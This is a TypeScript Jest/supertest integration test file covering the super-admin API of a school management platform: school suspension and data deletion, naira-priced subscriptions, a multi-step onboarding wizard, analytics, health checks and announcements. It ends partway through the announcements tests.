import dotenv from 'dotenv';
import path from 'path';

// Must be before any import that reads process.env (pool reads DATABASE_URL at import time)
dotenv.config({ path: path.join(__dirname, '../.env') });

import { randomUUID } from 'crypto';
import request from 'supertest';
import express from 'express';
import jwt from 'jsonwebtoken';

import pool from '../src/db/client';
import superAdminRouter, { csvCell } from '../src/routes/superAdmin';
import teacherDashboardRouter from '../src/routes/teacherDashboard';
import { detectSupportSession } from '../src/middleware/detectSupportSession';
import { errorHandler } from '../src/middleware/errorHandler';
import { supabaseAdmin } from '../src/supabaseClient';
import { cache, schoolCacheKey } from '../src/services/cacheService';

const SCHOOL_ID = 'a8f70089-aef1-4f65-a226-4c68d0380285';

const app = express();
app.use(express.json());
app.use('/api/super-admin', superAdminRouter);
app.use(errorHandler);

// Mirrors index.ts's /api/schools setup (detectSupportSession + a school-scoped
// router) so scoped impersonation tokens can be exercised end-to-end.
const schoolApp = express();
schoolApp.use(express.json());
schoolApp.use('/api/schools', detectSupportSession);
schoolApp.use('/api/schools', teacherDashboardRouter);
schoolApp.use(errorHandler);

function makeToken(userId: string, role: string, schoolId: string | null, email: string) {
  return jwt.sign({ user_id: userId, role, school_id: schoolId, email }, process.env.JWT_SECRET!, { expiresIn: '1h' });
}

describe('superAdmin — platform school management', () => {
  let superAdminUserId: string;
  let superAdminToken: string;
  let testSchoolId: string;
  const testSchoolSlug = `test-superadmin-${randomUUID()}`;

  beforeAll(async () => {
    const userResult = await pool.query<{ id: string }>(
      `INSERT INTO users (school_id, email, password_hash, role, first_name, last_name, teacher_mode, must_change_password)
       VALUES (NULL, $1, 'test-hash', 'super_admin', 'Super', 'Admin', 'subject', FALSE)
       RETURNING id`,
      [`superadmin-${randomUUID()}@test.com`]
    );
    superAdminUserId = userResult.rows[0].id;

    const userRow = await pool.query<{ email: string }>(`SELECT email FROM users WHERE id = $1`, [superAdminUserId]);
    superAdminToken = makeToken(superAdminUserId, 'super_admin', null, userRow.rows[0].email);

    const schoolResult = await pool.query<{ id: string }>(
      `INSERT INTO schools (name, slug, is_active) VALUES ($1, $2, true) RETURNING id`,
      ['Super Admin Test School', testSchoolSlug]
    );
    testSchoolId = schoolResult.rows[0].id;
  }, 20000);

  afterAll(async () => {
    await pool.query(`DELETE FROM platform_audit_logs WHERE target_school_id = $1 OR platform_admin_id = $2`, [testSchoolId, superAdminUserId]);
    await pool.query(`DELETE FROM schools WHERE id = $1`, [testSchoolId]);
    await pool.query(`DELETE FROM users WHERE id = $1`, [superAdminUserId]);
    await pool.end();
  });

  // ── Auth guard ──────────────────────────────────────────────────────────────

  it('GET /schools — principal token → 403', async () => {
    const token = makeToken(randomUUID(), 'principal', SCHOOL_ID, 'principal@test.com');
    const res = await request(app).get('/api/super-admin/schools').set('Authorization', `Bearer ${token}`);
    expect(res.status).toBe(403);
  });

  // ── GET /schools ────────────────────────────────────────────────────────────

  it('GET /schools — super_admin token → 200, array with at least one school', async () => {
    const res = await request(app).get('/api/super-admin/schools').set('Authorization', `Bearer ${superAdminToken}`);
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
    expect(Array.isArray(res.body.data.schools)).toBe(true);
    expect(res.body.data.schools.length).toBeGreaterThanOrEqual(1);
  });

  // ── GET /schools/:schoolId ──────────────────────────────────────────────────

  it('GET /schools/:schoolId — valid schoolId → 200, has school.name', async () => {
    const res = await request(app).get(`/api/super-admin/schools/${SCHOOL_ID}`).set('Authorization', `Bearer ${superAdminToken}`);
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
    expect(res.body.data.school.name).toBeDefined();
  });

  // ── PATCH /schools/:schoolId/suspend ───────────────────────────────────────

  it('PATCH /schools/:schoolId/suspend — no reason → 400 VALIDATION_ERROR', async () => {
    const res = await request(app)
      .patch(`/api/super-admin/schools/${testSchoolId}/suspend`)
      .set('Authorization', `Bearer ${superAdminToken}`)
      .send({});
    expect(res.status).toBe(400);
    expect(res.body.error.code).toBe('VALIDATION_ERROR');
  });

  it('PATCH /schools/:schoolId/suspend — reason <10 chars → 400 VALIDATION_ERROR', async () => {
    const res = await request(app)
      .patch(`/api/super-admin/schools/${testSchoolId}/suspend`)
      .set('Authorization', `Bearer ${superAdminToken}`)
      .send({ reason: 'short' });
    expect(res.status).toBe(400);
    expect(res.body.error.code).toBe('VALIDATION_ERROR');
  });

  it('PATCH /schools/:schoolId/suspend — valid reason → 200, is_active false', async () => {
    const res = await request(app)
      .patch(`/api/super-admin/schools/${testSchoolId}/suspend`)
      .set('Authorization', `Bearer ${superAdminToken}`)
      .send({ reason: 'Violates platform usage policy' });
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
    expect(res.body.data.is_active).toBe(false);
  });

  // ── PATCH /schools/:schoolId/reactivate ────────────────────────────────────

  it('PATCH /schools/:schoolId/reactivate — after suspend → 200, is_active true', async () => {
    const res = await request(app)
      .patch(`/api/super-admin/schools/${testSchoolId}/reactivate`)
      .set('Authorization', `Bearer ${superAdminToken}`)
      .send({ reason: 'Issue resolved, reactivating school' });
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
    expect(res.body.data.is_active).toBe(true);
  });

  it('PATCH /schools/:schoolId/reactivate — already active → 409 ALREADY_ACTIVE', async () => {
    const res = await request(app)
      .patch(`/api/super-admin/schools/${testSchoolId}/reactivate`)
      .set('Authorization', `Bearer ${superAdminToken}`)
      .send({ reason: 'Issue resolved, reactivating school' });
    expect(res.status).toBe(409);
    expect(res.body.error.code).toBe('ALREADY_ACTIVE');
  });

  // ── DELETE /schools/:schoolId/data ─────────────────────────────────────────

  it('DELETE /schools/:schoolId/data — wrong confirmation_token → 400 CONFIRMATION_FAILED', async () => {
    const res = await request(app)
      .delete(`/api/super-admin/schools/${testSchoolId}/data`)
      .set('Authorization', `Bearer ${superAdminToken}`)
      .send({ confirmation_token: 'wrong-token' });
    expect(res.status).toBe(400);
    expect(res.body.code).toBe('CONFIRMATION_FAILED');
  });

  it('DELETE /schools/:schoolId/data — correct slug → 200', async () => {
    const res = await request(app)
      .delete(`/api/super-admin/schools/${testSchoolId}/data`)
      .set('Authorization', `Bearer ${superAdminToken}`)
      .send({ confirmation_token: testSchoolSlug });
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
  });

  // ── Subscription Management ──────────────────────────────────────────────

  describe('Subscription Management', () => {
    let subSchoolId: string;
    let trialSchoolId: string;
    let subscriptionId: string;
    let trialSubscriptionId: string;

    beforeAll(async () => {
      const subSchoolResult = await pool.query<{ id: string }>(
        `INSERT INTO schools (name, slug, is_active) VALUES ($1, $2, true) RETURNING id`,
        ['Subscription Test School', `test-subscription-${randomUUID()}`]
      );
      subSchoolId = subSchoolResult.rows[0].id;

      const trialSchoolResult = await pool.query<{ id: string }>(
        `INSERT INTO schools (name, slug, is_active) VALUES ($1, $2, true) RETURNING id`,
        ['Subscription Trial School', `test-subscription-trial-${randomUUID()}`]
      );
      trialSchoolId = trialSchoolResult.rows[0].id;

      const trialSubResult = await pool.query<{ id: string }>(
        `INSERT INTO platform_subscriptions (school_id, plan, billing_cycle, amount_naira, subscription_status, trial_ends_at)
         VALUES ($1, 'trial', 'monthly', 0, 'trial', NOW() + INTERVAL '7 days')
         RETURNING id`,
        [trialSchoolId]
      );
      trialSubscriptionId = trialSubResult.rows[0].id;
    }, 20000);

    afterAll(async () => {
      await pool.query(`DELETE FROM platform_audit_logs WHERE target_school_id IN ($1, $2)`, [subSchoolId, trialSchoolId]);
      await pool.query(`DELETE FROM platform_subscriptions WHERE school_id IN ($1, $2)`, [subSchoolId, trialSchoolId]);
      await pool.query(`DELETE FROM schools WHERE id IN ($1, $2)`, [subSchoolId, trialSchoolId]);
    });

    // ── POST /subscriptions ───────────────────────────────────────────────

    it('POST /subscriptions — missing plan → 400', async () => {
      const res = await request(app)
        .post('/api/super-admin/subscriptions')
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ school_id: subSchoolId, billing_cycle: 'monthly', amount_naira: 50000 });
      expect(res.status).toBe(400);
    });

    it('POST /subscriptions — valid body → 201 with correct plan', async () => {
      const res = await request(app)
        .post('/api/super-admin/subscriptions')
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ school_id: subSchoolId, plan: 'basic', billing_cycle: 'monthly', amount_naira: 50000 });
      expect(res.status).toBe(201);
      expect(res.body.success).toBe(true);
      expect(res.body.data.plan).toBe('basic');
      subscriptionId = res.body.data.id;
    });

    it('POST /subscriptions — duplicate for same school → 409 SUBSCRIPTION_EXISTS', async () => {
      const res = await request(app)
        .post('/api/super-admin/subscriptions')
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ school_id: subSchoolId, plan: 'basic', billing_cycle: 'monthly', amount_naira: 50000 });
      expect(res.status).toBe(409);
      expect(res.body.error.code).toBe('SUBSCRIPTION_EXISTS');
    });

    it('POST /subscriptions — trial plan with no trial_ends_at → 201, defaults to 30 days out', async () => {
      const newSchoolResult = await pool.query<{ id: string }>(
        `INSERT INTO schools (name, slug, is_active) VALUES ($1, $2, true) RETURNING id`,
        ['Trial Default Test School', `test-trial-default-${randomUUID()}`]
      );
      const newSchoolId = newSchoolResult.rows[0].id;

      try {
        const before = Date.now();
        const res = await request(app)
          .post('/api/super-admin/subscriptions')
          .set('Authorization', `Bearer ${superAdminToken}`)
          .send({ school_id: newSchoolId, plan: 'trial', billing_cycle: 'monthly', amount_naira: 50000 });

        expect(res.status).toBe(201);
        expect(res.body.success).toBe(true);
        expect(res.body.data.trial_ends_at).toBeTruthy();

        const trialEndsAt = new Date(res.body.data.trial_ends_at).getTime();
        const expected = before + 30 * 24 * 60 * 60 * 1000;
        expect(Math.abs(trialEndsAt - expected)).toBeLessThan(60 * 1000);
      } finally {
        await pool.query(`DELETE FROM platform_audit_logs WHERE target_school_id = $1`, [newSchoolId]);
        await pool.query(`DELETE FROM platform_subscriptions WHERE school_id = $1`, [newSchoolId]);
        await pool.query(`DELETE FROM schools WHERE id = $1`, [newSchoolId]);
      }
    });

    it('POST /subscriptions — trial plan with amount_naira 0 → 201 (trials can be free)', async () => {
      const newSchoolResult = await pool.query<{ id: string }>(
        `INSERT INTO schools (name, slug, is_active) VALUES ($1, $2, true) RETURNING id`,
        ['Free Trial Test School', `test-free-trial-${randomUUID()}`]
      );
      const newSchoolId = newSchoolResult.rows[0].id;

      try {
        const res = await request(app)
          .post('/api/super-admin/subscriptions')
          .set('Authorization', `Bearer ${superAdminToken}`)
          .send({ school_id: newSchoolId, plan: 'trial', billing_cycle: 'monthly', amount_naira: 0 });

        expect(res.status).toBe(201);
        expect(res.body.success).toBe(true);
        expect(res.body.data.amount_naira).toBe('0.00');
      } finally {
        await pool.query(`DELETE FROM platform_audit_logs WHERE target_school_id = $1`, [newSchoolId]);
        await pool.query(`DELETE FROM platform_subscriptions WHERE school_id = $1`, [newSchoolId]);
        await pool.query(`DELETE FROM schools WHERE id = $1`, [newSchoolId]);
      }
    });

    it('POST /subscriptions — basic (paid) plan with amount_naira 0 → 400', async () => {
      const res = await request(app)
        .post('/api/super-admin/subscriptions')
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ school_id: subSchoolId, plan: 'basic', billing_cycle: 'monthly', amount_naira: 0 });
      expect(res.status).toBe(400);
      expect(res.body.error.message.fieldErrors.amount_naira).toBeTruthy();
    });

    it('POST /subscriptions syncs schools.subscription_tier to the new plan', async () => {
      const newSchoolResult = await pool.query<{ id: string }>(
        `INSERT INTO schools (name, slug, is_active) VALUES ($1, $2, true) RETURNING id`,
        ['Subscription Sync Test School', `test-sync-post-${randomUUID()}`]
      );
      const syncTestSchoolId = newSchoolResult.rows[0].id;

      const res = await request(app)
        .post('/api/super-admin/subscriptions')
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ school_id: syncTestSchoolId, plan: 'premium', billing_cycle: 'monthly', amount_naira: 60000 });

      expect(res.status).toBe(201);

      const schoolResult = await pool.query<{ subscription_tier: string }>(
        `SELECT subscription_tier FROM schools WHERE id = $1`,
        [syncTestSchoolId]
      );
      expect(schoolResult.rows[0].subscription_tier).toBe('premium');

      await pool.query(`DELETE FROM platform_audit_logs WHERE target_school_id = $1`, [syncTestSchoolId]);
      await pool.query(`DELETE FROM platform_subscriptions WHERE school_id = $1`, [syncTestSchoolId]);
      await pool.query(`DELETE FROM schools WHERE id = $1`, [syncTestSchoolId]);
    });

    it('POST /subscriptions invalidates school cache when subscription tier changes', async () => {
      const newSchoolResult = await pool.query<{ id: string }>(
        `INSERT INTO schools (name, slug, is_active) VALUES ($1, $2, true) RETURNING id`,
        ['Cache Invalidation Test School POST', `test-cache-post-${randomUUID()}`]
      );
      const cacheTestSchoolId = newSchoolResult.rows[0].id;

      const cacheSpy = jest.spyOn(cache, 'del');

      const res = await request(app)
        .post('/api/super-admin/subscriptions')
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ school_id: cacheTestSchoolId, plan: 'premium', billing_cycle: 'monthly', amount_naira: 60000 });

      expect(res.status).toBe(201);
      expect(cacheSpy).toHaveBeenCalledWith(schoolCacheKey(cacheTestSchoolId, 'data'));

      cacheSpy.mockRestore();
      await pool.query(`DELETE FROM platform_audit_logs WHERE target_school_id = $1`, [cacheTestSchoolId]);
      await pool.query(`DELETE FROM platform_subscriptions WHERE school_id = $1`, [cacheTestSchoolId]);
      await pool.query(`DELETE FROM schools WHERE id = $1`, [cacheTestSchoolId]);
    });

    // ── GET /subscriptions ────────────────────────────────────────────────

    it('GET /subscriptions — super_admin token → 200, has subscriptions array and summary', async () => {
      const res = await request(app)
        .get('/api/super-admin/subscriptions')
        .set('Authorization', `Bearer ${superAdminToken}`);
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(Array.isArray(res.body.data.subscriptions)).toBe(true);
      expect(res.body.data.summary).toBeDefined();
      expect(res.body.data.summary.total_mrr_naira).toBeDefined();
    });

    // ── PATCH /subscriptions/:id ──────────────────────────────────────────

    it("PATCH /subscriptions/:id — update plan to 'premium' → 200, plan updated", async () => {
      const res = await request(app)
        .patch(`/api/super-admin/subscriptions/${subscriptionId}`)
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ plan: 'premium' });
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.data.plan).toBe('premium');
    });

    it('PATCH /subscriptions/:id syncs schools.subscription_tier when plan changes', async () => {
      const res = await request(app)
        .patch(`/api/super-admin/subscriptions/${subscriptionId}`)
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ plan: 'enterprise' });

      expect(res.status).toBe(200);

      const schoolResult = await pool.query<{ subscription_tier: string }>(
        `SELECT subscription_tier FROM schools WHERE id = $1`,
        [subSchoolId]
      );
      expect(schoolResult.rows[0].subscription_tier).toBe('enterprise');
    });

    it('PATCH /subscriptions/:id invalidates school cache when subscription plan changes', async () => {
      const newSchoolResult = await pool.query<{ id: string }>(
        `INSERT INTO schools (name, slug, is_active) VALUES ($1, $2, true) RETURNING id`,
        ['Cache Invalidation Test School PATCH', `test-cache-patch-${randomUUID()}`]
      );
      const cacheTestSchoolId = newSchoolResult.rows[0].id;

      const subResult = await pool.query<{ id: string }>(
        `INSERT INTO platform_subscriptions (school_id, plan, billing_cycle, amount_naira, subscription_status)
         VALUES ($1, 'basic', 'monthly', 50000, 'active')
         RETURNING id`,
        [cacheTestSchoolId]
      );
      const testSubscriptionId = subResult.rows[0].id;

      const cacheSpy = jest.spyOn(cache, 'del');

      const res = await request(app)
        .patch(`/api/super-admin/subscriptions/${testSubscriptionId}`)
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ plan: 'premium' });

      expect(res.status).toBe(200);
      expect(cacheSpy).toHaveBeenCalledWith(schoolCacheKey(cacheTestSchoolId, 'data'));

      cacheSpy.mockRestore();
      await pool.query(`DELETE FROM platform_audit_logs WHERE target_school_id = $1`, [cacheTestSchoolId]);
      await pool.query(`DELETE FROM platform_subscriptions WHERE school_id = $1`, [cacheTestSchoolId]);
      await pool.query(`DELETE FROM schools WHERE id = $1`, [cacheTestSchoolId]);
    });

    // ── POST /subscriptions/:id/extend-trial ──────────────────────────────

    it('POST /subscriptions/:id/extend-trial — non-trial subscription → 400 NOT_A_TRIAL', async () => {
      const res = await request(app)
        .post(`/api/super-admin/subscriptions/${subscriptionId}/extend-trial`)
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ days: 14 });
      expect(res.status).toBe(400);
      expect(res.body.error.code).toBe('NOT_A_TRIAL');
    });

    it('POST /subscriptions/:id/extend-trial — trial subscription with days=14 → 200, new_trial_ends_at is 14 days later', async () => {
      const before = await pool.query<{ trial_ends_at: string }>(
        `SELECT trial_ends_at FROM platform_subscriptions WHERE id = $1`,
        [trialSubscriptionId]
      );
      const originalTrialEndsAt = new Date(before.rows[0].trial_ends_at);

      const res = await request(app)
        .post(`/api/super-admin/subscriptions/${trialSubscriptionId}/extend-trial`)
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ days: 14 });
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);

      const newTrialEndsAt = new Date(res.body.data.new_trial_ends_at);
      const diffDays = (newTrialEndsAt.getTime() - originalTrialEndsAt.getTime()) / (1000 * 60 * 60 * 24);
      expect(Math.round(diffDays)).toBe(14);
    });

    // ── POST /subscriptions/:id/record-payment ────────────────────────────

    it('POST /subscriptions/:id/record-payment — valid body → 200, returns amount_recorded', async () => {
      const res = await request(app)
        .post(`/api/super-admin/subscriptions/${subscriptionId}/record-payment`)
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ amount: 50000, reference: 'TXN-12345', payment_date: '2026-06-15' });
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.data.amount_recorded).toBe(50000);
    });

    // ── GET /subscriptions/mrr ─────────────────────────────────────────────

    it('GET /subscriptions/mrr — super_admin token → 200, has total_mrr and by_plan array', async () => {
      const res = await request(app)
        .get('/api/super-admin/subscriptions/mrr')
        .set('Authorization', `Bearer ${superAdminToken}`);
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.data.total_mrr).toBeDefined();
      expect(Array.isArray(res.body.data.by_plan)).toBe(true);
    });
  });

  // ── Onboarding Wizard ───────────────────────────────────────────────────────

  describe('Onboarding Wizard', () => {
    let sessionId: string;
    let onboardingSchoolId: string;
    let principalUserId: string | null = null;
    const onboardingSchoolEmail = `onboarding-${randomUUID()}@test.com`;
    const principalEmail = `onboarding-principal-${randomUUID()}@test.com`;

    afterAll(async () => {
      if (principalUserId) {
        await pool.query(`DELETE FROM users WHERE id = $1`, [principalUserId]);
        await supabaseAdmin.auth.admin.deleteUser(principalUserId);
      }
      if (onboardingSchoolId) {
        await pool.query(`DELETE FROM platform_audit_logs WHERE target_school_id = $1`, [onboardingSchoolId]);
        await pool.query(`DELETE FROM onboarding_sessions WHERE school_id = $1`, [onboardingSchoolId]);
        await pool.query(`DELETE FROM terms WHERE school_id = $1`, [onboardingSchoolId]);
        await pool.query(`DELETE FROM academic_sessions WHERE school_id = $1`, [onboardingSchoolId]);
        await pool.query(`DELETE FROM school_settings WHERE school_id = $1`, [onboardingSchoolId]);
        await pool.query(`DELETE FROM schools WHERE id = $1`, [onboardingSchoolId]);
      }
    }, 20000);

    // ── POST /onboarding ──────────────────────────────────────────────────

    it('POST /onboarding — missing school_name → 400', async () => {
      const res = await request(app)
        .post('/api/super-admin/onboarding')
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ school_email: onboardingSchoolEmail });
      expect(res.status).toBe(400);
    });

    it('POST /onboarding — valid body → 201, returns session_id and school_id', async () => {
      const res = await request(app)
        .post('/api/super-admin/onboarding')
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ school_name: 'Onboarding Test School', school_email: onboardingSchoolEmail });
      expect(res.status).toBe(201);
      expect(res.body.success).toBe(true);
      expect(res.body.data.session_id).toBeDefined();
      expect(res.body.data.school_id).toBeDefined();
      sessionId = res.body.data.session_id;
      onboardingSchoolId = res.body.data.school_id;
    });

    // ── GET /onboarding ───────────────────────────────────────────────────

    it('GET /onboarding — super_admin token → 200, array includes new session', async () => {
      const res = await request(app)
        .get('/api/super-admin/onboarding')
        .set('Authorization', `Bearer ${superAdminToken}`);
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(Array.isArray(res.body.data)).toBe(true);
      expect(res.body.data.some((s: { id: string }) => s.id === sessionId)).toBe(true);
    });

    // ── GET /onboarding/:sessionId ───────────────────────────────────────

    it('GET /onboarding/:sessionId — valid sessionId → 200, has next_step: 1', async () => {
      const res = await request(app)
        .get(`/api/super-admin/onboarding/${sessionId}`)
        .set('Authorization', `Bearer ${superAdminToken}`);
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.data.next_step).toBe(1);
    });

    // ── PATCH /onboarding/:sessionId/step/1 ──────────────────────────────

    it('PATCH /onboarding/:sessionId/step/1 — missing name → 400', async () => {
      const res = await request(app)
        .patch(`/api/super-admin/onboarding/${sessionId}/step/1`)
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ address: '123 Test Street', phone: '08012345678' });
      expect(res.status).toBe(400);
    });

    it("PATCH /onboarding/:sessionId/step/1 — valid { name, address, phone } → 200, step: 1, completed: true", async () => {
      const res = await request(app)
        .patch(`/api/super-admin/onboarding/${sessionId}/step/1`)
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ name: 'Onboarding Test School Updated', address: '123 Test Street', phone: '08012345678' });
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.data.step).toBe(1);
      expect(res.body.data.completed).toBe(true);
    });

    // ── PATCH /onboarding/:sessionId/step/5 ──────────────────────────────

    it('PATCH /onboarding/:sessionId/step/5 — weights not summing to 100 → 400 WEIGHT_SUM_ERROR', async () => {
      const res = await request(app)
        .patch(`/api/super-admin/onboarding/${sessionId}/step/5`)
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({
          components: [
            { name: 'CA 1', max_score: 10, weight_percent: 30 },
            { name: 'Examination', max_score: 70, weight_percent: 60 },
          ],
        });
      expect(res.status).toBe(400);
      expect(res.body.error.code).toBe('WEIGHT_SUM_ERROR');
    });

    it('PATCH /onboarding/:sessionId/step/5 — valid components summing to 100 → 200', async () => {
      const res = await request(app)
        .patch(`/api/super-admin/onboarding/${sessionId}/step/5`)
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({
          components: [
            { name: 'CA 1', max_score: 10, weight_percent: 30 },
            { name: 'Examination', max_score: 70, weight_percent: 70 },
          ],
        });
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
    });

    // ── PATCH /onboarding/:sessionId/step/6 ──────────────────────────────

    it('PATCH /onboarding/:sessionId/step/6 — missing email → 400', async () => {
      const res = await request(app)
        .patch(`/api/super-admin/onboarding/${sessionId}/step/6`)
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ first_name: 'Jane', last_name: 'Doe' });
      expect(res.status).toBe(400);
    });

    it('PATCH /onboarding/:sessionId/step/6 — valid principal data → 200, has temp_password in response', async () => {
      const res = await request(app)
        .patch(`/api/super-admin/onboarding/${sessionId}/step/6`)
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ first_name: 'Jane', last_name: 'Doe', email: principalEmail });
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(typeof res.body.data.temp_password).toBe('string');
      expect(res.body.data.temp_password.length).toBeGreaterThan(0);

      const userResult = await pool.query<{ id: string; role: string }>(`SELECT id, role FROM users WHERE email = $1`, [principalEmail]);
      expect(userResult.rows[0]).toBeDefined();
      expect(userResult.rows[0].role).toBe('principal');
      principalUserId = userResult.rows[0].id;
    }, 20000);

    // ── POST /onboarding/:sessionId/complete ─────────────────────────────

    it('POST /onboarding/:sessionId/complete — before steps 2,3,4 complete → 400 INCOMPLETE_WIZARD', async () => {
      const res = await request(app)
        .post(`/api/super-admin/onboarding/${sessionId}/complete`)
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ accepted_legal_terms: true });
      expect(res.status).toBe(400);
      expect(res.body.error.code).toBe('INCOMPLETE_WIZARD');
    });

    it('POST /onboarding/:sessionId/complete — after completing steps 1-6 → 200, school is_active=true', async () => {
      const step2Res = await request(app)
        .patch(`/api/super-admin/onboarding/${sessionId}/step/2`)
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ motto: 'Knowledge is Power', primary_colour: '#336699' });
      expect(step2Res.status).toBe(200);

      const step3Res = await request(app)
        .patch(`/api/super-admin/onboarding/${sessionId}/step/3`)
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({
          session_name: '2025/2026',
          terms: [
            { name: 'First Term', start_date: '2025-09-08', end_date: '2025-12-12' },
            { name: 'Second Term', start_date: '2026-01-05', end_date: '2026-04-03' },
            { name: 'Third Term', start_date: '2026-04-27', end_date: '2026-07-24' },
          ],
        });
      expect(step3Res.status).toBe(200);

      const step4Res = await request(app)
        .patch(`/api/super-admin/onboarding/${sessionId}/step/4`)
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({
          grades: [
            { label: 'A', min: 70, max: 100, remark: 'Excellent' },
            { label: 'B', min: 60, max: 69, remark: 'Very Good' },
            { label: 'C', min: 50, max: 59, remark: 'Good' },
            { label: 'D', min: 40, max: 49, remark: 'Pass' },
            { label: 'F', min: 0, max: 39, remark: 'Fail' },
          ],
        });
      expect(step4Res.status).toBe(200);

      const completeRes = await request(app)
        .post(`/api/super-admin/onboarding/${sessionId}/complete`)
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ accepted_legal_terms: true });
      expect(completeRes.status).toBe(200);
      expect(completeRes.body.success).toBe(true);
      expect(completeRes.body.data.is_active).toBe(true);

      const schoolResult = await pool.query<{ is_active: boolean }>(`SELECT is_active FROM schools WHERE id = $1`, [onboardingSchoolId]);
      expect(schoolResult.rows[0].is_active).toBe(true);
    }, 30000);
  });

  // ── Analytics ────────────────────────────────────────────────────────────────

  describe('Analytics', () => {
    it('GET /analytics/overview — super_admin token → 200, has total_schools >= 1', async () => {
      const res = await request(app)
        .get('/api/super-admin/analytics/overview')
        .set('Authorization', `Bearer ${superAdminToken}`);
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.data.total_schools).toBeGreaterThanOrEqual(1);
    }, 30000);

    it('GET /analytics/schools — super_admin token → 200, array with activity_score on each school', async () => {
      const res = await request(app)
        .get('/api/super-admin/analytics/schools')
        .set('Authorization', `Bearer ${superAdminToken}`);
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(Array.isArray(res.body.data)).toBe(true);
      expect(res.body.data.length).toBeGreaterThanOrEqual(1);
      for (const school of res.body.data) {
        expect(school.activity_score).toBeDefined();
      }
    });

    it('GET /analytics/feature-adoption — super_admin token → 200, has features array', async () => {
      const res = await request(app)
        .get('/api/super-admin/analytics/feature-adoption')
        .set('Authorization', `Bearer ${superAdminToken}`);
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(Array.isArray(res.body.data)).toBe(true);
      expect(res.body.data.length).toBeGreaterThan(0);
    });

    it('GET /analytics/growth — super_admin token → 200, months array length 12 with matching schools/students arrays', async () => {
      const res = await request(app)
        .get('/api/super-admin/analytics/growth')
        .set('Authorization', `Bearer ${superAdminToken}`);
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.data.months).toHaveLength(12);
      expect(res.body.data.schools).toHaveLength(12);
      expect(res.body.data.students).toHaveLength(12);
    });
  });

  // ── Platform Health ──────────────────────────────────────────────────────────

  describe('Platform Health', () => {
    it('GET /health/overview — super_admin token → 200, has active_support_sessions', async () => {
      const res = await request(app)
        .get('/api/super-admin/health/overview')
        .set('Authorization', `Bearer ${superAdminToken}`);
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(typeof res.body.data.active_support_sessions).toBe('number');
    });

    it('GET /health/crons — super_admin token → 200, array of cron records with name, schedule, last_status', async () => {
      const res = await request(app)
        .get('/api/super-admin/health/crons')
        .set('Authorization', `Bearer ${superAdminToken}`);
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(Array.isArray(res.body.data)).toBe(true);
      expect(res.body.data.length).toBeGreaterThan(0);
      for (const cronRecord of res.body.data) {
        expect(cronRecord.name).toBeDefined();
        expect(cronRecord.schedule).toBeDefined();
        expect(cronRecord.last_status).toBeDefined();
      }
    });
  });

  // ── Announcements ────────────────────────────────────────────────────────────

  describe('Announcements', () => {
    let announcementId: string;

    afterAll(async () => {
      await pool.query(`DELETE FROM platform_announcements WHERE created_by = $1`, [superAdminUserId]);
    });

    it('POST /announcements — missing title → 400', async () => {
      const res = await request(app)
        .post('/api/super-admin/announcements')
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({ body: 'This is a test announcement body.', type: 'info', target_plans: ['basic'] });
      expect(res.status).toBe(400);
    });

    it('POST /announcements — valid body → 201, returns announcement with id', async () => {
      const res = await request(app)
        .post('/api/super-admin/announcements')
        .set('Authorization', `Bearer ${superAdminToken}`)
        .send({
          title: 'Scheduled Maintenance',
          body: 'The platform will be undergoing scheduled maintenance this weekend.',
          type: 'maintenance',
          target_plans: ['basic', 'premium'],
        });
      expect(res.status).toBe(201);
      expect(res.body.success).toBe(true);
      expect(res.body.data.id).toBeDefined();
      announcementId = res.body.data.id;
    });

    it('GET /announcements — super_admin token → 200, includes new announcement', async () => {
      const res = await request(app)
        .get('/api/super-admin/announcements')
        .set('Authorization', `Bearer ${superAdminToken}`);
      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
      expect(res.body.data.some((a: { id: string }) => a.id === announcementId)).toBe(true);
    });

